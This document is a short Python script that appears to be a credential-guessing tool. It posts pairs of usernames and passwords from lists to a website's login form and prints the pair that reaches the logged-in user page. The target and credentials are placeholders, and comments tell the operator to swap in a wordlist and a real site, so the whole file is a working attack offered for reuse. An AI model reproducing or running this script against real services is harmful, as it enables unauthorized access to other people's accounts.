#!/usr/bin/python
# -*- coding: utf-8 -*-
from requests import session


User = ["FakeUser","RightUser?", "FakeUserr"]
Pass = ["FakePass", "RightPass?", "FakePasss"]
#----------Add Word or a Wordlist-------------------------------------------------------------1
i = 0
isOn = False

while (isOn == False & i < len(User)):
    payload = {
        "action" : "login",
        "username" : User[i],
        "password" : Pass[i]
    }

    with session() as c:

        c.post("https://website.com/login", data=payload)
        response = c.get("https://website.com/user")
#----------------------Change Website-----------------------------------------------------------2

        content_length = response.headers["content-length"]
        status = response.status_code
        print("URL = " + response.url)
        print("User = " + str(User[i]))
        print("content_length = " + str(content_length))
        print(status)

        if (response.url == "https://website.com/user"):
            isOn = True
            print ("User: " + User[i] + " , Pass: "+ Pass[i])
        i = i + 1
